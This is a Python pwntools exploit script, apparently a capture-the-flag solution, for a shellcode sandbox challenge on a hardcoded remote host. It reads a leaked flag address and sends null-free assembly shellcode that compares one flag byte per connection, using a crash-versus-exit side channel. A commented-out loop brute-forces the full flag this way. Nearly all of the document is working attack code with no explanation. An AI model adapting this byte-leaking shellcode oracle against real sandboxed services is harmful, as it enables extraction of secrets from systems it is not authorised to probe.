#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'warning'
context.terminal = ['tmux', 'split', '-h']

ENCODING = 'ISO-8859-1'
s = lambda senddata : p.send(senddata.encode(ENCODING))
sa = lambda recvdata, senddata : p.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
sl = lambda senddata : p.sendline(senddata.encode(ENCODING))
sla = lambda recvdata, senddata : p.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
r = lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f : p.recv(numb, timeout=timeout).decode(ENCODING)
ru = lambda recvdata, timeout=0x3f3f3f3f : p.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING)
uu32 = lambda data : u32(data.encode(ENCODING), signed='unsigned')
uu64 = lambda data : u64(data.encode(ENCODING), signed='unsigned')
iu32 = lambda data : u32(data.encode(ENCODING), signed='signed')
iu64 = lambda data : u64(data.encode(ENCODING), signed='signed')
up32 = lambda data : p32(data, signed='unsigned').decode(ENCODING)
up64 = lambda data : p64(data, signed='unsigned').decode(ENCODING)
ip32 = lambda data : p32(data, signed='signed').decode(ENCODING)
ip64 = lambda data : p64(data, signed='signed').decode(ENCODING)

def bruteforce(idx, ch):
    global p
    local = 0
    if local:
        p = process('./sandbox')
    else:
        p = remote('124.16.75.162', 31056)

    ru('gift: 0x')
    flag_addr = int(ru('\n')[:-1], 16)
    info('flag_addr = ' + hex(flag_addr))

    magic = 0xdeadbeefdeadbeef

    sh = asm('''
        xor rbx, rbx
        xor rdx, rdx
        mov rbx, {}
        mov rdx, {}
        xor rbx, rdx
        mov al, [rbx + {}]
        cmp al, {}
        je label
        int 3
    label:
        xor rax, rax
        mov al, 0x3c
        xor rdi, rdi
        syscall
    '''.format(flag_addr ^ magic, magic, idx, ch))
    #print(disasm(sh))

    #gdb.attach(p, 'set follow-fork-mode child\nb *0x5555554010ea\nc')

    if b'\0' in sh:
        p.close()
        return 'failed'

    ru('pls input your shellcode: ')
    p.send(sh + b'\0')

    #p.interactive()

    try:
        r = p.recv(timeout=0.1)
    except EOFError:
        r = ''
    finally:
        p.close()

        return r

print(bruteforce(0, ord('f')))
print(bruteforce(0, ord('l')))
print(bruteforce(4, ord('{')))

'''
flag = ''
idx = 0
target = b'OVER!\n'
table = '0123456789abcdefghijklmnopqrstuvwxyz!{}_'
while True:
    if bruteforce(idx, 0) == target:
        warning('Over')
        break
    else:
        warning('Not the end')
    for c in table:
        r = bruteforce(idx, ord(c))
        if r == target:
            flag += c
            idx += 1
            warning(flag)
            break
'''

